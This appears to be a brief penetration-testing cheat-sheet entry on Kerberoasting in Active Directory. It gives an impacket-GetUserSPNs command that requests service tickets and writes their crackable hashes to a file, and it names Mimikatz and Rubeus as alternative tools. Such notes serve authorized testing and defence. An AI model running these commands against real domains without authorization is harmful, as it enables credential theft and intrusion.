# Kerberoasting
By default, all standard domain users can request a copy of all service accounts ST (with SPN value set) along with their correlating password hashes.
`impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -outputfile kerb.hash -dc-ip IP`
`Mimikatz`
`Rubeus`